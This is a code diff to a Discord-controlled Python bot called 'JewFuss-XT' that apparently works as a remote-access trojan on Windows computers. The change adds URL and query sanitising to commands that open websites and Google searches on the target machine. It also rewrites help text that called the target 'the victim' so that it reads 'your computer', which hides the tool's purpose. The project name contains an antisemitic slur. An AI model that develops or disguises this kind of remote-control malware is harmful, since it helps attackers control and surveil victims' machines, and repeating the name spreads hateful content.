@@ -7,6 +7,7 @@ from comtypes import CLSCTX_ALL
 import ctypes.wintypes
 import soundcard as sc
 import win32com.client
+import urllib.parse
 import win32process
 import numpy as np
 import subprocess
@@ -53,7 +54,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.9.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.9.3" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -2820,20 +2821,67 @@ async def kill(ctx, arg: str = ""):
     except Exception as e:
         await ctx.send(f"Error terminating task: {str(e)}")
 
-@bot.command(aliases=["url"], help="Opens the given website on the victim's default browser.", usage="$website <url>")
+@bot.command(aliases=["url"], help="Opens the given website on your default browser.", usage="$website <url>")
 async def website(ctx, *, url: str):
     try:
-        webbrowser.open(url)
-        await ctx.send(f"Opened and maximized the website: {url}")
+        s = (url or "").strip().strip("<>").strip()
+        if not s:
+            return await ctx.send("Could not open: No URL provided.")
+
+        if "://" not in s:
+            s = "https://" + s
+
+        try:
+            parsed = urllib.parse.urlparse(s)
+        except Exception:
+            return await ctx.send("Could not open: That URL couldn't be parsed.")
+
+        scheme = (parsed.scheme or "").lower()
+        if scheme not in ("http", "https"):
+            return await ctx.send(f"Could not open: Blocked scheme `{scheme}`. Only http/https are allowed.")
+
+        host = (parsed.hostname or "").strip()
+        if not host:
+            return await ctx.send("Could not open: Missing hostname.")
+
+        safe_url = urllib.parse.urlunparse((scheme, parsed.netloc, parsed.path or "", parsed.params or "", parsed.query or "", parsed.fragment or "",))
+
+        opened = False
+        try:
+            opened = webbrowser.open_new_tab(safe_url)
+        except Exception:
+            opened = False
+
+        if opened:
+            await ctx.send(f"Opened: {safe_url}")
+        else:
+            await ctx.send(f"Tried to open, but the browser rejected it: {safe_url}")
+
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(aliases=["gsearch"], help="Googles the given text on the victim's computer.", usage="$google <url>")
+
+@bot.command(aliases=["gsearch"], help="Googles the given text on your computer.", usage="$google <query>")
 async def google(ctx, *, q: str):
     try:
-        url = f"https://www.google.com/search?q=" + q.replace('"', '\\"').replace(" ", "+")
-        webbrowser.open(url)
-        await ctx.send(f"Googled `{q}`")
+        q = (q or "").strip()
+        if not q:
+            return await ctx.send("Please provide something to search for.")
+
+        query = urllib.parse.quote_plus(q, safe="")
+        url = f"https://www.google.com/search?q={query}"
+
+        opened = False
+        try:
+            opened = webbrowser.open_new_tab(url)
+        except Exception:
+            opened = False
+
+        if opened:
+            await ctx.send(f"Googled `{q}`")
+        else:
+            await ctx.send("Tried to open Google, but the browser rejected it.")
+
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
